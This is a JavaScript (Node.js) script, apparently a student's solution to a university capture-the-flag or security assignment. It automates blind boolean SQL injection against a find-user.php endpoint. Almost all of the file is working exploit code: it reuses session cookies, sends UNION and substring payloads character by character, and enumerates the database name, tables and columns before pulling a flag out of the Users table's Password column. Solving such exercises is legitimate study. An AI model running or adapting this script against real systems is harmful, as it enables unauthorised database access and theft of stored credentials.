//http://assignment-code-warriors.unimelb.life/find.php --> user check in thie URL
//The FIND USER button eventListner will concat what user input value to the URL-->http://assignment-code-warriors.unimelb.life//find-user.php?username=

import fetch from "node-fetch";
import { exec } from "child_process";
import util from "util";
import { FormData } from "node-fetch";
import { Headers } from "node-fetch";
import { time } from "console";

const execPro = util.promisify(exec);

const chars =
  "{}_,.?!@#$%^&[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

// Combine and keep Cookie info (CSRF_token & session_id) login
async function cookieLogin(sqlInject) {
  const fileName = "getCookie.py";
  await execPro("python" + " " + fileName, function (error, stdout, stderr) {
    if (error) {
      console.log("stderr", error);
    }
    if (stdout) {
      // console.log("stdout", stdout);
      let astr = stdout.split("\r\n").join("");
      //   console.log(astr);
      let [login, status, cookie] = astr.split("...");
      cookie = JSON.parse(cookie);
      // console.log(cookie);
      const { CSRF_token, PHPSESSID } = cookie;
      console.log("CSRF_token is : " + CSRF_token);
      console.log("PHPSESSID is : " + PHPSESSID);

      // sql Injection and detect database
      sqlInject(CSRF_token, PHPSESSID, chars);
    }
  });
}

// bind search SQL injection script function
const sqlInject = async (token, ssid, characters) => {
  console.log("");
  console.log("Start to detect database ... ");
  const url =
    "http://assignment-code-warriors.unimelb.life/find-user.php?username=";

  const db = [];
  let flag = 0;
  // detect DataBase
  for (let idx = 1; idx < 100; idx++) {
    for await (const char of Array.from(characters)) {
      const payload = encodeURIComponent(
        `' union select 1,2,3 where binary substring(database(),${idx},1)='${char}';#`
      );

      await fetch(`${url}${payload}`, {
        headers: {
          Cookie: `CSRF_token=${token}; PHPSESSID=${ssid}`,
        },
      })
        .then((response) => response.text())
        .then((result) => {
          //   console.log(result);
          if (result === "true") {
            db.push(char);
            console.log(char);
            return;
          } else {
            // console.log("pass");
            flag += 1;
          }
        })
        .catch((error) => console.log("error", error));
    }
    // console.log(flag);
    // console.log(Array.from(characters).length);
    if (flag === Array.from(characters).length) {
      flag = 0;
      break;
    }
    flag = 0;
  }
  const database = db.join("");
  console.log(database);
  getTables(token, ssid, characters, database);
};

// Once the DataBase is found, script for detecting tables
const getTables = async function (token, ssid, characters, db) {
  console.log("");
  console.log(`Start to detect tables in ${db} ... `);
  const url =
    "http://assignment-code-warriors.unimelb.life/find-user.php?username=";

  const tables = [];
  let flag = 0;
  // detect Tables
  for (let idx = 1; idx < 100; idx++) {
    for await (const char of Array.from(characters)) {
      const payload = encodeURIComponent(
        `'union select 3,2,1 from (select group_concat(table_name) as tbs from
          information_schema.tables where table_schema='${db}')as tba where binary
          substring(tbs, ${idx}, 1) = '${char}';#`
      );

      await fetch(`${url}${payload}`, {
        headers: {
          Cookie: `CSRF_token=${token}; PHPSESSID=${ssid}`,
        },
      })
        .then((response) => response.text())
        .then((result) => {
          //   console.log(result);
          if (result === "true") {
            tables.push(char);
            console.log(char);
            return;
          } else {
            // console.log("pass");
            flag += 1;
          }
        })
        .catch((error) => console.log("error", error));
    }
    // console.log(flag);
    // console.log(Array.from(characters).length);
    if (flag === Array.from(characters).length) {
      flag = 0;
      break;
    }
    flag = 0;
  }
  const tbs = tables.join("").split(",");
  console.log(tbs);

  // Iterate each table

  iterateT(token, ssid, characters, db, tbs);
};

// const tables = ["testing", "Users", "Trainings"];
// Iterate tbles
async function iterateT(token, ssid, characters, db, tbs) {
  const tableColumns = new Map([]);
  for (const tb of tbs) {
    // if (tb === "Users") {
    const columnsOfEachTable = await getColumns(
      token,
      ssid,
      characters,
      db,
      tb
    );
    // }
    console.log("ok");
    tableColumns.set(tb, columnsOfEachTable);
  }
  // integrate all tables and their following columns in one map object for the Secure Database.
  console.log(tableColumns.entries());

  for (const tb of tableColumns.keys()) {
    // check column
    if (tb === "Users") {
      const columns = [...tableColumns.get(tb)];
      let colf;
      columns.forEach((col) => {
        if (col === "Password") {
          colf = col;
        }
      });
      // get the flag
      await getFlag(token, ssid, characters, db, tb, colf);
    }
  }
}

// detect flag
const getFlag = async function getFlag(token, ssid, characters, db, tb, col) {
  console.log("");
  const url =
    "http://assignment-code-warriors.unimelb.life/find-user.php?username=";
  console.log(`Start to get flag in ${col} column of ${tb} table  ... `);

  const rflag = [];
  let flag = 0;

  // detect Flag
  for (let idx = 1; idx < 100; idx++) {
    for await (const char of Array.from(characters)) {
      // pay attention for SQL syntax as: Every derived table must have its own alias
      const payload = encodeURIComponent(
        `'union select 5,6,7 from (select GROUP_CONCAT(${col}) as r
          from ${db}.${tb} where ${col} LIKE '%FLAG%') as drvtb where binary substring(r, ${idx} , 1) = '${char}';#`
      );

      await fetch(`${url}${payload}`, {
        headers: {
          Cookie: `CSRF_token=${token}; PHPSESSID=${ssid}`,
        },
      })
        .then((response) => response.text())
        .then((result) => {
          //   console.log(result);
          if (result === "true") {
            rflag.push(char);
            console.log(char);
            return;
          } else {
            // console.log("pass");
            flag += 1;
          }
        })
        .catch((error) => console.log("error", error));
    }

    // console.log(flag);
    // console.log(Array.from(characters).length);

    if (flag === Array.from(characters).length) {
      flag = 0;
      break;
    }
    flag = 0;
  }

  const mbflag = rflag.join("");
  console.log(mbflag);
};

// Once the tables are found, script for detecting for columns in each table
const getColumns = async function (token, ssid, characters, db, tb) {
  console.log("");
  console.log(`Start to detect columns in ${tb} ... `);
  const url =
    "http://assignment-code-warriors.unimelb.life/find-user.php?username=";

  const columns = [];
  let flag = 0;
  // detect Columns
  for (let idx = 1; idx < 100; idx++) {
    for await (const char of Array.from(characters)) {
      const payload = encodeURIComponent(
        `'union select 2,2,3 from (select GROUP_CONCAT(column_name) as clm
        from information_schema.columns where table_name = '${tb}' and
        table_schema='${db}') as aclms where binary substring(clm, ${idx} , 1) = '${char}';#`
      );

      await fetch(`${url}${payload}`, {
        headers: {
          Cookie: `CSRF_token=${token}; PHPSESSID=${ssid}`,
        },
      })
        .then((response) => response.text())
        .then((result) => {
          //   console.log(result);
          if (result === "true") {
            columns.push(char);
            console.log(char);
            return;
          } else {
            // console.log("pass");
            flag += 1;
          }
        })
        .catch((error) => console.log("error", error));
    }
    console.log(flag);
    console.log(Array.from(characters).length);
    if (flag === Array.from(characters).length) {
      flag = 0;
      break;
    }
    flag = 0;
  }
  const clms = columns.join("").split(",");
  console.log(clms);
  return clms;
};

// main
cookieLogin(sqlInject);
